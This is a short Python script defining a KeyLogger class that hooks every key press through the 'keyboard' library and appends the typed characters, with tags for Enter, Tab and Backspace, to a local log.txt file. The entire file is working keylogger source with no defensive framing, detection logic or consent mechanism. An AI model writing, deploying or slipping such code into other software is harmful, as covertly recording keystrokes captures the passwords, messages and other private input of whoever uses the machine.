import keyboard

class KeyLogger():
    def __init__(self):
        self.log = ""

    # Saving an key to a file 
    def saveElemFile(self):
        file = open("log.txt", "a+")
        file.write(self.log)
        file.close()

    # Taking the key
    def takeKey(self, e):
        name = e.name

        if len(name) > 1:
            if name == "enter":
                name = " [Enter]\n"
            elif name == "space":
                name = " "
            elif name == "tab":
                name = " [Tab]\n"
            elif name == "backspace" and len(self.log) >= 1:
                name = " [Backspace] "
            else:
                name = ""
        
        self.log = name
        self.saveElemFile()
    
    # Main function
    def start(self):
        file = open("log.txt", "a+")
        file.write("\n")
        file.close()

        keyboard.on_press(self.takeKey)
        keyboard.wait()

# Starting
if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()